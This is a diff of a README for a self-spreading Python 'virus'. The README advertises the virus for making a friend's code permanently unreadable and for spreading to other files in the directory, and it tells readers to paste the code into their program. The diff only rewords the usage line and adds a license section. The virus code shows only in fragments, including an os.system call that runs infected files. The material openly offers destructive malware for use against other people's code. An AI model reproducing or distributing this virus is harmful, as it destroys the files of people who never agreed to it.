@@ -4,7 +4,7 @@
 So, ever got access to your friend's code, and want to make the code permently unreadable?
 Well with this, you can, it's one of the fastest ways to do that, and it also spreads to other files in the dirertory.
 ### How to use it
-You can just copy and paste the code below into the program or copy and paste the code in `main.py`
+You can just copy and paste the code below into the program or copy and paste the code in `main.py`, it's really that easy!
 ```python3
 # VIRUS SAYS HI!
 import sys
@@ -42,3 +42,5 @@ for i in python_files:
   os.system(f'python3 {os.path.abspath(file)} $')
 # VIRUS SAYS BYE!
 ```
+### License
+You can find the license in `LICENSE.md`
